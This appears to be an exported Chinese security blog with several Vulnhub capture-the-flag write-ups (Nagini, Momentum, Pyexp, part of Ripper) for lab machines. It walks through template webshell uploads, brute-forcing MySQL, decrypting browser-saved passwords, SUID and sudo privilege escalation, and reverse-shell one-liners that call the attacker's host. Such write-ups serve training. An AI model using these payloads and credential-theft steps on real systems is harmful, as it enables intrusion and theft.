<p>然后去10.0.2.22/joomla/administrator/index.php，用修改后的密码登录。</p>
<h2 id="get-shell">get shell</h2>
<p>进入后台之后如何get shell可以查看：<a href="4.%20Vulnhub%20AdmX%20Writeup.md">4. Vulnhub AdmX Writeup</a></p>
<p>直接寻找模板 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates -&gt; Templates -&gt; [随便选一个] -&gt; [随便选一个php文件]</span><br></pre></td></tr></table></figure></p>
<p>将<code>/usr/share/webshells/php/php-reverse-shell.php</code>的内容代替原来php的内容，注意修改ip和端口。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175900.png" /></p>
<p>可以利用dirsearch找到对应php文件的路径。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422180121.png" /></p>
<p>kali监听对应的端口，然后网页访问该文件</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422180226.png" /></p>
<h2 id="权限提升">权限提升</h2>
<h3 id="获得snape用户权限">获得snape用户权限</h3>
<p>发现靶机上存在三个用户root, hermoine, snape。先查看snape的家目录，发现有一个奇怪的文件 .creds.txt，这看上去会像是一个口令，因此查看内容，发现是经过base64编码的 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// .creds.txt</span><br><span class="line">TG92ZUBsaWxseQ==</span><br><span class="line">-&gt; Love@lilly</span><br></pre></td></tr></table></figure></p>
<p>猜测这可能是ssh登录的密码，尝试登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422194046.png" /></p>
<p>成功登录。</p>
<h3 id="获得hermoine用户权限">获得hermoine用户权限</h3>
<p>先到对应的家目录，查看内容。发现了三个比较奇怪的点：</p>
<ol type="1">
<li>家目录下存在着.ssh目录，如果存在ssh密钥登录，那么对应的公钥就会保存在该目录下。但是现在里面为空；</li>
<li>家目录下居然有一个bin目录，这不应该在这，而且里面的文件居然有suid权限，属主为hermoine，并且是可执行文件，初步猜测利用该文件获得hermoine的权限；</li>
<li>还有一个奇怪的目录.mozilla，这是火狐浏览器的目录，但是现在没有权限查看；</li>
</ol>
<p>先去看一下suid文件的作用</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422194531.png" /></p>
<p>发现这就是一个将目标文件cp到另一个地方的可执行文件，结合.ssh目录，猜测：<strong>利用该程序将ssh公钥放入到hermoine的.ssh目录下，然后使用ssh密钥登录</strong></p>
<p>在kali上生成ssh公、私钥（注意，kali哪个用户生成的就用哪个用户登录！！！） <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">输入命令之后，一直回车就好了</span><br></pre></td></tr></table></figure></p>
<p>将公钥发送到snape用户的目录里去 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp id_rsa.pub snape@10.0.2.22:~/ <span class="comment"># 拷贝文件到对应</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195004.png" /></p>
<p>然后利用 su_cp 将公钥复制到/home/hermoine/.ssh目录下，并且名字一定要改为authorized_keys！！！否则无法登录，我尝试过！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195336.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195515.png" /></p>
<p>其他尝试过，都不能登录。</p>
<p>然后利用密钥登录即可</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195550.png" /></p>
<h3 id="获得root权限">获得root权限</h3>
<p>这台靶机利用的方式比较奇怪。还记得刚刚在hermoine目录下的.mozilla吗，里面保存的都是一些火狐浏览器相关的信息，当然也包括一些登录信息。</p>
<p>进入到.mozilla/firefox/g2mhbq0o.default目录内，发现有logins.json和key4.db文件，利用工具提取出里面的信息，工具地址：<a href="https://github.com/lclevy/firepwd">GitHub - lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords</a></p>
<p>该工具的作用： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This educational tool was written to illustrate how Mozilla passwords (Firefox, Thunderbird) are protected using contents of files key4.db (or key3.db), logins.json (or signons.sqlite)</span><br></pre></td></tr></table></figure></p>
<p>将logins.json和key4.db文件与firepwd.py放到同一个目录下，然后执行 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 firepwd.py</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422200531.png" /></p>
<p>得到用户名和密码，直接ssh登录</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422200625.png" /></p>
<p>成功获得root权限，现在依次查看三个flag，分别是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /var/www/html/horcrux1.txt</span><br><span class="line">horcrux_&#123;MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O&#125;</span><br><span class="line">-&gt; horcrux_&#123;3: SlythEriN&#x27;s LocKEet dEstroYeD bY RoN&#125;</span><br><span class="line"></span><br><span class="line">// /home/hermoine/horcrux2.txt</span><br><span class="line">horcrux_&#123;NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=&#125;</span><br><span class="line">-&gt; horcrux_&#123;4: Helga Hufflepuff&#x27;s Cup destroyed by Hermione&#125;</span><br><span class="line"></span><br><span class="line">// /root/horcrux3.txt</span><br><span class="line">  ____                            _         _       _   _                 </span><br><span class="line"> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ </span><br><span class="line">| |   / _ \| &#x27;_ \ / _` | &#x27;__/ _` | __| | | | |/ _` | __| |/ _ \| &#x27;_ \/ __|</span><br><span class="line">| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \</span><br><span class="line"> \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/</span><br><span class="line">                  |___/                                                   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Medium</span><br><span class="line">Machine Name: Nagini</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Nagini machine.</span><br><span class="line">Here is your third hocrux: horcrux_&#123;NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=&#125;</span><br><span class="line">-&gt; horcrux_&#123;5: Diadem of Ravenclaw destroyed by Harry&#125;</span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">总结</h1>
<p>该靶机难度挺大的，主要是涉及到许多没见过的知识点：</p>
<ul>
<li>Gopher + SSRF</li>
<li>HTTP3协议</li>
<li>浏览器密码还原</li>
</ul>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SSRF</tag>
        <tag>HTTP3协议</tag>
        <tag>Gopher</tag>
        <tag>浏览器密码还原</tag>
      </tags>
  </entry>
  <entry>
    <title>16 Vulnhub Momentum Writeup</title>
    <url>/2022/04/26/16%20Vulnhub%20Momentum%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，如果之前就知道redis相关漏洞的话，那难度就是简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/momentum-1,685/">Momentum: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>Web路径爆破</li>
<li><strong>JS脚本分析</strong></li>
<li><strong>AES解密</strong></li>
<li><strong>Redis认证漏洞</strong></li>
</ul>
<p>参考：</p>
<ul>
<li><a href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a></li>
<li><a href="http://www.npmdoc.org/crypto-jszhongwenwendangcrypto-js-jszhongwenjiaochengjiexi.html">crypto-js资料</a></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.239</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.239</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160344.png" /></p>
<p>信息：</p>
<ul>
<li>22端口的服务位ssh</li>
<li>80端口的服务为http</li>
<li>靶机操作系统为Debian</li>
</ul>
<h2 id="访问http服务-get-shell">2.2. 访问http服务 + get shell</h2>
<h3 id="http服务">2.2.1. http服务</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160525.png" /></p>
<p>网站的页面有四张图片，并且这些图片可以点击，第一次点击可以放大图片，第二次点击就会显示图片的详细信息。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160616.png" /></p>
<p>注意到url中有一个参数id，并且id的值和这张图片的name是一样的。如果id随便输入，会发现页面显示的和我们输入的是一样的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160756.png" /></p>
<p>之前说过，这种情况下可能存在着三种类型的漏洞：</p>
<ol type="1">
<li>SQL注入、</li>
<li>XSS</li>
<li>SSTI</li>
</ol>
<p>经过尝试，只存在XSS漏洞，但是目前还没有什么用。</p>
<p>查看源码也没发现多少有用的信息，接下来进行路径扫描。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161035.png" /></p>
<p>经过对所有目录的查看，最终发现/js/main.js中的代码有点奇怪： <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewDetails</span>(<span class="params">str</span>) </span>&#123;                                                                                </span><br><span class="line">  <span class="built_in">window</span>.location.href = <span class="string">&quot;opus-details.php?id=&quot;</span>+str;                                                       </span><br><span class="line">&#125;                                                                                                          </span><br><span class="line"><span class="comment">/*                                                                                                       </span></span><br><span class="line"><span class="comment">var CryptoJS = require(&quot;crypto-js&quot;);                                                                       </span></span><br><span class="line"><span class="comment">var decrypted = CryptoJS.AES.decrypt(encrypted, &quot;SecretPassphraseMomentum&quot;);</span></span><br><span class="line"><span class="comment">console.log(decrypted.toString(CryptoJS.enc.Utf8));</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<p>（我不怎么会js）根据对代码的分析，我们刚刚输入的id，然后会经过viewDetails定位到对应的文件，然后返回相关信息，如果没有对应的文件，就直接显示id的值。这里的重点在于注释部分，<strong>先是调用了crypto-js库，然后调用了解密方法，最后将解密的结果变成字符串</strong>。</p>
<p>经过搜索，发现这个库的decrypt方法的使用如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161944.png" /></p>
<p>因此猜测 SecretPassphraseMomentum 就是解密的密钥，那么现在就需要找到加密后的字符串解密就可以了。</p>
<p>这时候想到了之前得到的XSS漏洞，一般XSS都和cookie有关，因此利用该漏洞查看一下cookie的值（也可以直接抓包） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到cookie的值 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</span><br></pre></td></tr></table></figure></p>
<p>随便找一个AES在线解密平台，解密得到一串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
<h3 id="get-shell">2.2.2. get shell</h3>
<p>现在只有一个ssh需要用户名和密码，因此尝试登录，最终的用户名和密码为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名: auxerre</span><br><span class="line">密码: auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162538.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>首先进行信息收集，发现靶机的内核版本不是最新的</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162635.png" /></p>
<p>因此尝试用msf搜索，虽然有几个可以利用的exp，但是经尝试，都无法提权。最终在查看 /etc/passwd 的时候发现了一个特殊的用户 redis</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162742.png" /></p>
<p>这是一个非关系型的数据库，一直都有许多的安全问题。其中有一个<strong>未授权认证的漏洞</strong>，就是只要部署了redis，那么就会监听所有的网卡，并且只要能够访问到当前主机，那么都可以访问到redis，不需要经过认证就可以进行操作！redis默认监听6479端口，因此先查看端口，看一下是否启用了redis</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163318.png" /></p>
<p>发现确实启用了。那么直接访问 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli <span class="comment"># 访问redis</span></span><br><span class="line">info <span class="comment"># 查看相关信息，如果能显示，说明存在未授权认证漏洞</span></span><br><span class="line">keys * <span class="comment"># 获取所有键</span></span><br><span class="line">get keyName <span class="comment"># 获取键的信息</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163858.png" /></p>
<p>利用得到的密码登录root</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163932.png" /></p>
<p>最后，读取2个flag: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /hoem/auxerre/user.txt</span><br><span class="line">[ Momentum - User Owned ]</span><br><span class="line">---------------------------------------</span><br><span class="line">flag : 84157165c30ad34d18945b647ec7f647</span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">// 2. /root/toot.txt</span><br><span class="line">[ Momentum - Rooted ]</span><br><span class="line">---------------------------------------</span><br><span class="line">Flag : 658ff660fdac0b079ea78238e5996e40</span><br><span class="line">---------------------------------------</span><br><span class="line">by alienum with &lt;3</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度中等。我在打靶过程中遇到了两个问题：</p>
<ol type="1">
<li>我也找到了XSS漏洞和JS代码，但是没有将两者联想起来；</li>
<li>之前从来没有遇到过redis，不知道这是什么；</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>JS脚本分析</tag>
        <tag>Redis认证漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>17 Vulnhub Pyexp Writeup</title>
    <url>/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度不是很高，但是很有特点。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/pyexp-1,534/">pyexp: 1 ~ VulnHub</a></li>
</ul>
<p>注意：</p>
<ul>
<li>使用 WMware 运行虚拟机</li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>SSH密码爆破</li>
<li>MySQL密码爆破</li>
<li>MySQL执行代码</li>
<li>编写解密代码</li>
<li>sudo权限漏洞</li>
<li>python函数</li>
<li>本地提权</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<p>kali：192.168.137.10</p>
<p>靶机: 192.168.137.11</p>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.137.11</span><br><span class="line">sudo nmap -p1337,3306 -A 192.168.137.11</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png" /></p>
<p>信息：</p>
<ul>
<li>1337端口的服务为ssh；</li>
<li>3306端口的服务为MySQL，MariaDB是MySQL的一个分支；</li>
</ul>
<p>很奇怪的是该靶机居然没有http服务！！！</p>
<h2 id="mysql密码爆破">2.2. MySQL密码爆破</h2>
<p>可以先进行ssh密码爆破，因此此时不知道靶机上有哪些用户，可以先用root跑</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png" /></p>
<p>时间非常的长，并且最终也跑不出来。</p>
<p>MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt</span><br></pre></td></tr></table></figure></p>
<p>（hydra出了点问题，使用medusa进行爆破也是一样的）</p>
<p>最终得到结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">username: root</span><br><span class="line">password: prettywoman</span><br></pre></td></tr></table></figure>
<p>远程登录数据库： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.137.11 -u root -p</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png" /></p>
<h2 id="信息收集">2.3. 信息收集</h2>
<p>总所周知，MySQL是可以提权的，但是这里有一个问题就是，当前执行MySQL的用户是kali的用户，并不是靶机的用户，因此就算利用MySQL命令执行提权得到的也是kali的用户的权限。可以利用下述命令执行系统查看id就可以知道。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\! id &lt;==&gt; system id &lt;==&gt; select do_system(&#x27;id&#x27;) # 靶机上无法运行第三个</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png" /></p>
<p>还可以读取MySQL的默认配置以及系统文件的内容，默认配置文件没有任何有用的信息，而/etc/passwd里面反而有信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看是否能够进行文件的读取和写入操作</span><br><span class="line">show variables like &#x27;secure_file_priv&#x27;;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line"></span><br><span class="line">可以！</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png" /></p>
<p>可以发现除了root之外，还有一个lucy用户。其实这里也可以再次进行ssh爆破，但是还是没结果。</p>
<p>其实也可以查看一下/home/lucy/.ssh/id_rsa，如果存在的话，就可以利用密钥登陆ssh，可惜不存在。</p>
<p>最终查看数据库发现有四个数据库 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> data               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>其中，只有第一个是后来生成的，而后面的三个都是MySQL自带的。查看第一个数据，发现有一个表fernet，里面的信息如下：</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>cred</th>
<th>keyy</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=</td>
<td>UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=</td>
</tr>
</tbody>
</table>
<p>没有任何其他的信息了，那么信息应该就隐藏在上述表格中，因为cred和key看起来很像是密码和密钥。</p>
<h2 id="get-shell">2.4. get shell</h2>
<p>这里其实卡了非常久，后来百度知道了fernet其实是python中用来加解密的一个库。</p>
<p>官方文档：<a href="https://cryptography.io/en/latest/fernet/">Fernet (symmetric encryption) — Cryptography 38.0.0.dev1 documentation</a></p>
<p>可以尝试官方给的加密代码生成密钥和加密，会发现密钥和加密的字符串和keyy和cred非常类似。因此确定是利用fernet进行加密的。</p>
<p>有两种解密方法：</p>
<ol type="1">
<li>在线网站：<a href="https://asecuritysite.com/encryption/ferdecode">Fernet (Decode)</a></li>
<li>编写python代码</li>
</ol>
<p>前者比较简单：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233417.png" /></p>
<p>后者演示：(如果利用官方的解密代码查看过生成的key和token，就会发现它们是byte型的，所以前面加b)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b<span class="string">&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span></span><br><span class="line">token = b<span class="string">&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span></span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure></p>
<p>根据/etc/passwd的内容，猜测这是ssh登录的账号和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: lucy</span><br><span class="line">password: wJ9`&quot;Lemdv9[FEw- # 这密码能爆破出来就有鬼了</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427233859.png" /></p>
<p>切记要指定端口！！！</p>
<h2 id="权限提升">2.5. 权限提升</h2>
<p>在信息收集的时候发现： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234055.png" /></p>
<p>查看一下该文件的权限配置 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucy@pyexp:~$ ls -l /opt/exp.py</span><br><span class="line">-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py</span><br></pre></td></tr></table></figure></p>
<p>读取文件内容： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lucy@pyexp:~$ cat /opt/exp.py</span><br><span class="line">uinput = raw_input(<span class="string">&#x27;how are you?&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(uinput)</span><br></pre></td></tr></table></figure></p>
<p>心里狂喜，exec是python的函数，可以执行python代码。并且该文件的属主为root，如果用该文件得到shell，那就成功提权到root。</p>
<p>输入如下命令直接提权：(提前用which确定一下是否有bash) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pty; pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234407.png" /></p>
<p>也可以利用之前python反弹shell的代码：(kali先监听) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.10&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427234612.png" /></p>
<p>还可以这么写反弹shell，效果和上面的一样。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;nc 192.168.137.10 4444 -e /bin/bash&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>读取两个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/lucy/user.txt</span><br><span class="line">8ca196f62e91847f07f8043b499bd9be</span><br><span class="line"></span><br><span class="line">// 2. /root/root.txt</span><br><span class="line">a7a7e80ff4920ff06f049012700c99a8</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机难度并不算高，非常有特点，以往的靶机都是通过web进行get shell，而这台靶机通过数据库信息来get shell。</p>
<p>主要的难点在能否知道fernet是python的加解密的库。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>MySQL密码爆破</tag>
        <tag>sudo提权</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>15 Vulnhub Ripper Writeup</title>
    <url>/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/ripper-1,706/">Ripper: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低 -&gt; 中</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li><strong>Web信息搜索</strong></li>
<li><strong>内部系统泄露</strong></li>
<li>代码审计</li>
<li><strong>备份文件泄密</strong></li>
<li>Webmin漏洞利用</li>
<li>Metasploit</li>
<li>CVE-2021-3493(专门针对Ubuntu)</li>
</ul>
<p>参考资料：</p>
<ul>
<li><a href="http://rips-scanner.sourceforge.net/">RIPS - free PHP security scanner using static code analysis</a></li>
<li><a href="https://github.com/briskets/CVE-2021-3493">GitHub - briskets/CVE-2021-3493: Ubuntu OverlayFS Local Privesc</a></li>
<li><a href="https://san3ncrypt3d.com/2021/06/20/ripper/">Ripper VulnHub Walkthrough – San3ncrypt3d – Making cybersecurity a habit &amp; Privacy a Goal</a></li>
<li><a href="https://www.yiibai.com/linux/find.html">find命令 - Linux命令大全教程™</a></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<p>kali: 10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.23</span><br><span class="line">sudo nmap -p22,80,10000 -sV 10.0.2.23</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153009.png" /></p>
<p>收集信息：</p>
<ul>
<li>22端口上的服务是ssh</li>
<li>80端口的服务为http，版本为Apache2.4.29</li>
<li>10000端口的服务为http，版本为webmin 1.910</li>
</ul>
<p>这里，我百度了一下webmin 1.910，发现webmin是一个开源的web应用程序，并且版本&lt;=1.910的存在远程命令执行漏洞，不过需要知道用户名和密码。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>首先查看了以下80端口，发现就是Apache的一个安装好之后的界面，并没有更多的信息。接着又访问了10000端口，提示需要用SSL模式，也就是https访问</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153310.png" /></p>
<p>进入之后，得到一个登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153331.png" /></p>
<p>尝试使用默认账号 admin/admin 登录，发现没有效果。又尝试了几个弱口令，发现也没有任何效果。</p>
<p>先查看以下80端口的robots.txt，发现80端口不存在该文件。查看10000端口的该文件，发现了一丝信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153627.png" /></p>
<p>将其base64解码得到一句话：<strong>we scan php codes with rips</strong></p>
